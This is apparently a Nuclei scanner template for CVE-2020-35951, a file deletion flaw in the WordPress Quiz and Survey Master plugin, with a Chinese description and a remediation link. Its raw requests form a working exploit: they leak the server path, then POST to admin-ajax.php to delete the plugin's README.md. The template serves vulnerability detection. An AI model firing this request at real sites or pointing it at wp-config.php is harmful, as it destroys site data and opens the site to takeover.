id: CVE-2020-35951
info:
  name: Wordpress Quiz and Survey Master <7.0.1 - Arbitrary File Deletion
  author:
  - l0ne1y
  description: |-
    WordPress Plugin Quiz and Survey Master  任意文件删除导致重装漏洞
    WordPress是WordPress（Wordpress）基金会的一套使用PHP语言开发的博客平台。该平台支持在PHP和MySQL的服务器上架设个人博客网站。

    Quiz and Survey Master plugin before 7.0.1 for WordPress 存在安全漏洞，该漏洞允许用户删除任意文件，如wp-config.php文件，这可以有效地使站点脱机，并允许攻击者可利用该漏洞在他们的控制下重新安装WordPress实例。
  severity: critical
  remediation: |-
    官方修复方案:
    1.目前厂商已发布升级补丁以修复漏洞，补丁获取链接：
    https://www.wordfence.com/blog/2020/08/critical-vulnerabilities-patched-in-quiz-and-survey-master-plugin/
requests:
- matchers:
  - type: word
    part: body
    words:
    - '{"type":"success","message":"File removed successfully"}'
  - type: dsl
    dsl:
    - contains((body_1), '# Quiz And Survey Master') && status_code_4==301 && !contains((body_4),
      '# Quiz And Survey Master')
  extractors:
  - name: fullpath
    type: regex
    regex:
    - not found in <b>([/a-z_]+)wp
    group: 1
    part: body
    internal: true
  matchers-condition: and
  raw:
  - |
    GET /wp-content/plugins/quiz-master-next/README.md HTTP/1.1
    Host: {{Hostname}}
  - |
    GET /wp-content/plugins/quiz-master-next/tests/_support/AcceptanceTester.php HTTP/1.1
    Host: {{Hostname}}
  - |
    POST /wp-admin/admin-ajax.php HTTP/1.1
    Host: {{Hostname}}
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBJ17hSJBjuGrnW92


    ------WebKitFormBoundaryBJ17hSJBjuGrnW92
    Content-Disposition: form-data; name="action"

    qsm_remove_file_fd_question
    ------WebKitFormBoundaryBJ17hSJBjuGrnW92
    Content-Disposition: form-data; name="file_url"

    {{fullpath}}wp-content/plugins/quiz-master-next/README.md
    ------WebKitFormBoundaryBJ17hSJBjuGrnW92--
  - |
    GET /wp-content/plugins/quiz-master-next/README.md HTTP/1.1
    Host: {{Hostname}}
  req-condition: true
